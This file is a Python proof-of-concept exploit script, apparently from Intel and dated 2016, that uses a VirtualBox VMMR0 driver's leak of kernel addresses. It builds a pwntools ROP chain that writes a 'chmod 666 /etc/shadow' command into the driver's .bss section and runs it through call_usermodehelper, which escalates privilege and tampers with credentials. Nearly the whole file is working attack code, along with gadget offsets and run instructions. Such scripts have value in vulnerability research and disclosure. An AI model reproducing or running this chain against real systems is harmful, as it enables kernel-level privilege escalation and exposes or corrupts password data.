#!/usr/bin/env python3.5
#
# vbox_poc.py - Exploit VirtualBox leakage of kernel address space
#
# Copyright (c) 2016, Intel Corporation
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#    * Redistributions of source code must retain the above copyright notice,
#      this list of conditions and the following disclaimer.
#    * Redistributions in binary form must reproduce the above copyright
#      notice, this list of conditions and the following disclaimer in the
#      documentation and/or other materials provided with the distribution.
#    * Neither the name of Intel Corporation nor the names of its contributors
#      may be used to endorse or promote products derived from this software
#      without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'''
gcc -g -D OF_SIZE=128 userspace.c -o userspace
python3 ./poc.py userspace VMMR0.r0 payload 20

Open another shell session and run this
rm /tmp/shadow && touch /tmp/shadow && watch -n 0.2 ls -lAF /tmp/shadow
Now run the poc
./poc.py userspace VMMR0.r0 payload 30 0x7ffff78da000

VMMR0:  http://www.ropshell.com/ropsearch?h=f81f7bdd9ffe47e093805c9d2f626f38
pop rdi; ret;                       VMMR0 + 0x07b62a
pop rax; ret;                       VMMR0 + 0x01f7bd
mov rax,(rdi)                       VMMR0 + 0x081643
syscall; ret;                       VMMR0 + 0x012c3c0
push rsp; ret;                      VMMR0 + 0x01f7ad
pop rbp; ret;                       VMMR0 + 0x028d
xor eax, eax; ret;                  VMMR0 + 0x08b8
retq;                               VMMR0 + 0x01ea33
'''
import sys
from pwn import *
from unalignedrop.gadget_finder import gadget
from unalignedrop.elf_sections import section

# For some insane reason (probably due to how ELF works) when we load the
# target_binary into memory in userspace.c everything is 0x40 above where it
# normally is. Therefore we use some addition to fix that.
class Adjuster(object):
    def __init__(self, offset=0):
        '''
        Specify an offset to be used for adjustment
        '''
        self.offset = int(offset)

    def __call__(self, addr):
        '''
        Return the addr + the offset specified on creation
        '''
        return self.offset + int(addr)

    def add(self, add):
        self.offset += int(add)
        return self.offset

def kallsyms_lookup_name(sym_name):
    with open('/proc/kallsyms', 'rb') as i:
        for l in i.read().decode('utf-8').split('\n'):
            if sym_name == l.split()[-1]:
                return int(l.split()[0], 16)

def leaked(start_leaker, search_for):
    # Get the address from the leak
    leaker = process(start_leaker)
    leak = ''
    search_for = search_for.split('/')[-1]
    while not isinstance(leak, int):
        leak = leaker.recv().decode('utf-8').replace('\r', '')
        leak = [l for l in leak.split('\n') if 'vboxdrv:' in l and search_for in l]
        if len(leak) < 1:
            continue
        leak = leak[-1].split()
        if len(leak) < 3:
            continue
        leak = int(leak[-2], 16)
    return leak, leaker

def write4(rop, gadget_file, adjuster, string_location, string):
    # pop rax; ret;
    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
    # rop.raw(adjuster(0x2f0eb))
    # /etc
    rop.raw(string)
    # pop rdi; ret;
    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
    # rop.raw(adjuster(0x257e9))
    # set rdi
    rop.raw(string_location)
    # mov rax, (rdi)
    rop.raw(adjuster(gadget('mov %rax, (%rdi); ret;', gadget_file)))
    # rop.raw(adjuster(0x80da3))
    return rop

def build(leak, gadget_file, sled_length, adjuster):
    # Load the target binary
    with open(gadget_file, 'rb') as i:
        binary = ELF.from_bytes(i.read(), vma=leak)
    # Create the ROP stack
    rop = ROP(binary, should_load_gadgets=False)

    # Adjust found instructions
    adjuster.add(leak)

    # Put a nice lil ret seld on der
    for i in range(0, sled_length):
        # ret;
        rop.raw(adjuster(gadget('ret;', gadget_file)))

    # Build a string in the .bss section of the target driver
    # the .bss section starts at the address the driver was loaded
    # We have to adjust because the gadget we have is rdi + 0x2a50
    string_location = adjuster(section('.bss', gadget_file))
    print('string_location:', hex(string_location))

    # rop = write4(rop, gadget_file, adjuster, string_location, b'/tmp')
    rop = write4(rop, gadget_file, adjuster, string_location + 0,
            b'/bin')
    rop = write4(rop, gadget_file, adjuster, string_location + 4,
            b'/bas')
    rop = write4(rop, gadget_file, adjuster, string_location + 8,
            b'h\x00-c')
    rop = write4(rop, gadget_file, adjuster, string_location + 12,
            b'\x00chm')
    rop = write4(rop, gadget_file, adjuster, string_location + 16,
            b'od 6')
    rop = write4(rop, gadget_file, adjuster, string_location + 20,
            b'66 /')
    rop = write4(rop, gadget_file, adjuster, string_location + 24,
            b'etc/')
    rop = write4(rop, gadget_file, adjuster, string_location + 28,
            b'shad')
    rop = write4(rop, gadget_file, adjuster, string_location + 32,
            b'ow\x00\x00')


    rop = write4(rop, gadget_file, adjuster, string_location + 40,
            string_location)
    rop = write4(rop, gadget_file, adjuster, string_location + 48,
            string_location + 10)
    rop = write4(rop, gadget_file, adjuster, string_location + 56,
            string_location + 13)
    rop = write4(rop, gadget_file, adjuster, string_location + 64,
            0x0)

    # Now call chmod

    # pop rax; ret;
    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
    # set rax
    rop.raw(string_location)
    # pop rdi; ret;
    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
    # set rdi
    rop.raw(string_location)
    # pop rsi; ret;
    rop.raw(adjuster(gadget('pop %rsi; ret;', gadget_file)))
    # set rsi
    rop.raw(string_location + 40)
    # pop rcx; ret;
    rop.raw(adjuster(gadget('pop %rcx; ret;', gadget_file)))
    # set rcx
    rop.raw(0x1)
    # pop rdx; ret;
    rop.raw(adjuster(gadget('pop %rdx; ret;', gadget_file)))
    # set rdx
    rop.raw(0x0)
    # Address of call_usermodehelper from /proc/kallsyms
    rop.raw(kallsyms_lookup_name('call_usermodehelper'))
    # rop.raw(0x0)
    rop.raw(0xbabebabe)

    # Display our completed ROP chain
    print(rop.dump())
    # Return it as bytes to be writen out
    return bytes(rop)

def create_exploit(target_binary, payload_file, sled_length, leak, adjuster):
    exploit = build(leak, target_binary, sled_length, adjuster)
    with open(payload_file, 'wb') as o:
        o.write(exploit)
    return exploit

def attack_userspace(target_binary, payload_file, sled_length):
    leak, leaker = leaked(['./userspace', target_binary, payload_file],
            target_binary)
    print('Leaked address is', str(hex(leak)))
    exploit = create_exploit(target_binary, payload_file, sled_length, leak, Adjuster(0x40))
    leaker.shutdown('send')
    leaker.shutdown()
    print(leaker.recvall().decode('utf-8'))

def attack_kernel(target_binary, payload_file, sled_length):
    leak, leaker = leaked(['dmesg', '--color=never'], target_binary)
    leaker.shutdown()
    print('Leaked address is', str(hex(leak)))
    exploit = create_exploit(target_binary, payload_file, sled_length, leak, Adjuster(0x0))
    args = ['./query_app']
    print(args)
    p = process(args)
    print('sending payload...')
    p.send(exploit)
    p.shutdown('send')
    print('payload sent')
    print(p.recvall())
    p.shutdown()

def main():
    # Set the pwntools context
    context.clear(arch='amd64', kernel='amd64')
    # Make sure we have enough args
    if len(sys.argv) < 4:
        print('Usage %s attack_method target_binary payload_file [leak]'.format(sys.argv[1]))
        sys.exit(1)
    # Set the common variables
    attack_method = sys.argv[1]
    target_binary = sys.argv[2]
    payload_file = sys.argv[3]
    sled_length = int(sys.argv[4])
    # Choose what to do baised on number of vars given
    if len(sys.argv) == 5:
        if attack_method == 'userspace':
            attack_userspace(target_binary, payload_file, sled_length)
        elif attack_method == 'kernel':
            attack_kernel(target_binary, payload_file, sled_length)
    else:
        leak = int(sys.argv[5], 16)
        create_exploit(target_binary, payload_file, sled_length, leak, Adjuster(0x40))

if __name__ == '__main__':
    main()
